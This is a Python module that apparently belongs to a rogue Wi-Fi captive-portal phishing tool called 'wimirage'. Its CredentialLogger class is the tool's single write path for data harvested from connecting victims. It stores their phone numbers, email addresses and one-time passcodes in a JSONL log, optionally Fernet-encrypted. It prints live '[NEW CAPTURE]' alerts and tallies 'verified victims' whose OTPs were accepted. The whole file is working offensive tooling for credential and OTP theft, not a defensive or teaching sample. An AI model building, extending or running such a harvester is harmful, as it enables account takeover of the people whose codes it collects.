"""Persistent credential log (JSONL, optionally Fernet-encrypted).

Exposes :class:`CredentialLogger`, the single write-path for any data the
captive portal receives. All output is JSONL so downstream tooling can
``jq``/``grep`` it easily. Optionally encrypts phone/email/OTP fields if
the ``cryptography`` package is installed and a key is supplied.
"""

import json
import logging
import os
import queue
import threading
import time  # needed by CredentialLogger.flush_now(timeout)
from dataclasses import asdict
from datetime import datetime
from queue import Queue

from core.models import Credential
from core.paths import DEFAULT_LOG_FILE as _DEFAULT_LOG_FILE, LOGS_DIR, ensure_logs_dir

logger = logging.getLogger("wimirage")

__all__ = ["CredentialLogger", "CredentialCryptoError"]

# In-memory cap on ``self.credentials`` (Section: post-audit hardening).
# Long engagements previously accumulated every record in RAM forever;
# beyond this bound oldest entries are evicted from memory only — the
# disk JSONL remains complete for post-hoc analysis.
MAX_IN_MEMORY = 5000


class CredentialCryptoError(RuntimeError):
    """Raised when credential encryption fails — fail-closed, never store plaintext."""


class CredentialLogger:
    """JSONL-backed credential log with optional Fernet field encryption."""

    VALID_STAGES = {"phone_email_submitted", "otp_verified", "otp_failed", "unknown"}

    # Class attributes preserved for back-compat (some tests refer to
    # ``CredentialLogger.DEFAULT_LOG_FILE`` directly). The variable
    # shadowing at the top of this module is renamed to avoid the
    # recursion trap of re-using the same name for both.
    DEFAULT_LOG_DIR = LOGS_DIR
    DEFAULT_LOG_FILE = _DEFAULT_LOG_FILE

    def __init__(
        self,
        log_file: str | None = None,
        encrypted: bool = False,
        encryption_key: bytes = b"",
    ) -> None:
        """Initialise the logger; loads any existing JSONL on disk.

        Args:
            log_file: Path to write/read the JSONL log. Defaults to
                ``logs/captured_credentials.jsonl``.
            encrypted: If True, phone/email/OTP fields are Fernet-encrypted.
            encryption_key: 32-byte urlsafe-base64 Fernet key.
        """
        if log_file is None:
            ensure_logs_dir()
            log_file = self.DEFAULT_LOG_FILE
        self.log_file = log_file
        self.credentials: list[Credential] = []
        self.encrypted = encrypted
        self.encryption_key = encryption_key

        # Section 5 #5 — batch flush. ``_write_queue`` accumulates
        # entries; an internal worker flushes by 10 items OR 5s.
        self._write_queue: Queue[dict] = Queue()
        self._flush_lock = threading.Lock()
        self._flush_thread = threading.Thread(target=self._flush_worker, daemon=True)
        self._flush_thread.start()

        self._load_existing()

    # ------------------------------------------------------------------
    # Encryption (Section 8 #10 — lazy cryptography import)
    # ------------------------------------------------------------------

    def _encrypt_field(self, value: str) -> str:
        """Return Fernet-encrypted ``value``; fail closed on any error.

        Captured PII must never silently fall back to plaintext storage:
        if the key is malformed or encryption fails for any reason, we
        raise :class:`CredentialCryptoError` so the caller can surface a
        loud operator-facing failure instead of writing cleartext to disk.
        """
        if not self.encrypted or not self.encryption_key or value is None:
            return value
        try:
            from cryptography.fernet import Fernet  # type: ignore
        except ImportError:
            raise RuntimeError(
                "cryptography is required for encrypted_logs=True. "
                "Install with: pip install cryptography"
            ) from None
        try:
            encrypted: bytes = Fernet(self.encryption_key).encrypt(value.encode())
            return encrypted.decode()
        except (ValueError, TypeError, RuntimeError) as e:
            # Fernet raises InvalidToken on bad key length and
            # cryptography raises ValueError for malformed PEM. Fail
            # closed: refuse to store plaintext rather than degrade
            # silently — an operator misconfiguration must not leak PII.
            logger.error(
                "Encryption failed (%s: %s); refusing to store credential "
                "in plaintext. Fix encryption_key and retry.",
                type(e).__name__,
                e,
            )
            raise CredentialCryptoError(
                f"credential encryption failed: {type(e).__name__}: {e}"
            ) from e

    # ------------------------------------------------------------------
    # Load / write
    # ------------------------------------------------------------------

    def _load_existing(self) -> None:
        """Populate ``self.credentials`` from the JSONL file on disk."""
        if not os.path.exists(self.log_file):
            return
        try:
            with open(self.log_file, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    data = json.loads(line)
                    self.credentials.append(Credential(**data))
        except (OSError, json.JSONDecodeError, TypeError) as e:
            logger.warning(f"Failed to load existing logs: {e}")
            self.credentials = []

    def log_credential(
        self,
        client_ip: str,
        phone: str | None = None,
        email: str | None = None,
        otp: str | None = None,
        stage: str = "unknown",
    ) -> None:
        """Append a credential record (memory + disk).

        Args:
            client_ip: Source IP of the captured client.
            phone: Captured phone number.
            email: Captured email.
            otp: Captured OTP, if any.
            stage: One of ``VALID_STAGES``. Unknown values collapse to ``"unknown"``.
        """
        if stage not in self.VALID_STAGES:
            stage = "unknown"

        entry = Credential(
            timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            client_ip=client_ip,
            phone=self._encrypt_field(phone) if phone else phone,
            email=self._encrypt_field(email) if email else email,
            otp=self._encrypt_field(otp) if otp and self.encrypted else otp,
            stage=stage,
        )
        self.credentials.append(entry)
        # Cap in-memory growth: evict oldest entries beyond MAX_IN_MEMORY.
        # The disk JSONL (via _write_queue) still carries every record.
        if len(self.credentials) > MAX_IN_MEMORY:
            del self.credentials[: len(self.credentials) - MAX_IN_MEMORY]

        log_entry = asdict(entry)
        # Section 5 #5 + Section 7 #3 — single source of disk-IO truth is
        # ``_write_queue``. Putting the entry here means the batch worker
        # owns the write path; we don't also explicitly flush here, which
        # would duplicate every entry.
        try:
            self._write_queue.put_nowait(log_entry)
        except queue.Full:
            # Bounded queue: dropping is safer than blocking the
            # caller. The next batch iteration would re-attempt anyway.
            pass
        except ValueError:
            # queue was closed underneath us; benign shutdown glitch.
            pass

        self._print_entry(entry)

    # Section 5 #5 — batched JSONL flush.

    def _flush_worker(self) -> None:
        """Drain ``_write_queue`` in groups up to 10 or every 5 seconds."""
        batch: list[dict] = []
        while True:
            try:
                item = self._write_queue.get(timeout=5.0)
                batch.append(item)
            except queue.Empty:
                item = None
            while True:
                try:
                    batch.append(self._write_queue.get_nowait())
                except queue.Empty:
                    break
                if len(batch) >= 10:
                    break
            if batch:
                self._flush(batch)
                batch = []
            if item is None and self._write_queue.empty() and not batch:
                continue

    def _flush(self, batch: list[dict]) -> None:
        """Append ``batch`` to disk under ``self._flush_lock``."""
        with self._flush_lock:
            try:
                os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
                with open(self.log_file, "a", encoding="utf-8") as f:
                    for entry in batch:
                        f.write(json.dumps(entry, default=str) + "\n")
                    f.flush()
                    try:
                        os.fsync(f.fileno())
                    except OSError:
                        pass
            except OSError as e:
                logger.error(f"Failed to write credential log: {e}")

    # ------------------------------------------------------------------
    # Display (kept on stdout because they're CLI-facing UX messages)
    # ------------------------------------------------------------------

    def _print_entry(self, entry: "Credential") -> None:
        """Pretty-print the freshly-captured entry to stdout."""
        _green = "\033[92m"
        _bold = "\033[1m"
        _yellow = "\033[93m"
        _reset = "\033[0m"

        print(f"\n{_green}{_bold}[NEW CAPTURE]{_reset}")
        print(f"  Time:   {entry.timestamp}")
        if entry.phone:
            print(f"  Phone:  {_yellow}{entry.phone}{_reset}")
        if entry.email:
            print(f"  Email:  {_yellow}{entry.email}{_reset}")
        if entry.otp:
            print(f"  OTP:    {_yellow}{entry.otp}{_reset}")
        print(f"  IP:     {entry.client_ip}")
        print(f"  Stage:  {entry.stage}")

    def flush_now(self, timeout: float = 5.0) -> None:
        """Block until pending writes hit disk (or ``timeout`` seconds pass).

        Used by tests that need to assert on the JSONL file before a
        second ``CredentialLogger`` instance re-reads the same path.
        Production code does NOT need this — the batch worker flushes
        every 10 entries OR every 5s on its own.

        Args:
            timeout: Maximum wall-clock seconds to wait for the queue to
                drain. A timeout does NOT raise; callers that need an
                assertion can check ``self._write_queue.empty()`` after.
        """
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline and not self._write_queue.empty():
            time.sleep(0.02)
        # Belt-and-braces: drain whatever's left directly into _flush.
        with self._flush_lock:
            leftover: list[dict] = []
            while not self._write_queue.empty():
                try:
                    leftover.append(self._write_queue.get_nowait())
                except queue.Empty:
                    break
            if leftover:
                try:
                    ensure_logs_dir()
                    with open(self.log_file, "a", encoding="utf-8") as f:
                        for entry in leftover:
                            f.write(json.dumps(entry, default=str) + "\n")
                        f.flush()
                        try:
                            os.fsync(f.fileno())
                        except OSError:
                            pass
                except OSError as e:
                    logger.error(f"Failed to write credential log: {e}")

    def get_all(self) -> list[Credential]:
        """Return a snapshot list of in-memory captured credentials."""
        return list(self.credentials)

    def display_summary(self) -> None:
        """Print a short summary card (counts of captures / verified victims)."""
        _green = "\033[92m"
        _bold = "\033[1m"
        _cyan = "\033[96m"
        _reset = "\033[0m"

        total = len(self.credentials)
        verified = len([c for c in self.credentials if c.stage == "otp_verified"])
        unique_phones = len({c.phone for c in self.credentials if c.phone})
        unique_emails = len({c.email for c in self.credentials if c.email})

        print(f"\n{_cyan}{_bold}{'=' * 50}{_reset}")
        print(f"{_green}{_bold}  CAPTURE SUMMARY{_reset}")
        print(f"{_cyan}{_bold}{'=' * 50}{_reset}")
        print(f"  Total entries:     {total}")
        print(f"  Verified victims:  {verified}")
        print(f"  Unique phones:     {unique_phones}")
        print(f"  Unique emails:     {unique_emails}")
        print(f"  Log file:          {self.log_file}")
        print(f"  Encrypted:         {self.encrypted}")
        print(f"{_cyan}{_bold}{'=' * 50}{_reset}\n")

    def display_all(self) -> None:
        """Print every captured credential as a tabular dump to stdout."""
        if not self.credentials:
            print("[*] No credentials captured yet.")
            return

        print("\n" + "=" * 80)
        print(f"{'Time':<22} {'Phone':<18} {'Email':<25} {'Stage'}")
        print("=" * 80)

        for entry in self.credentials:
            phone = entry.phone or "N/A"
            email = entry.email or "N/A"
            print(f"{entry.timestamp:<22} {phone:<18} {email:<25} {entry.stage}")

        print("=" * 80 + "\n")
